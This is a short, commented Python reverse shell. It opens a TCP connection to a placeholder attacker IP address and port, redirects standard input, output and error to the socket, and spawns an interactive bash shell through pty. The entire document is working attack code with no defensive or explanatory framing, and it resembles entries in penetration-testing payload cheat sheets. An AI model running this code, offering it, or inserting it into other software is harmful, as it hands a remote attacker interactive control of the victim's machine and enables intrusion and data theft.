```sh
import pty
import socket
import os

# Define the remote host and port to connect to
HOST = '10.8.3.12'  # Replace with the attacker's IP address
PORT = 4242        # Replace with the desired port number

# Create and connect the socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# Redirect standard file descriptors to the socket
os.dup2(s.fileno(), 0)  # Redirect stdin
os.dup2(s.fileno(), 1)  # Redirect stdout
os.dup2(s.fileno(), 2)  # Redirect stderr

# Spawn a new bash shell
pty.spawn('/bin/bash')
```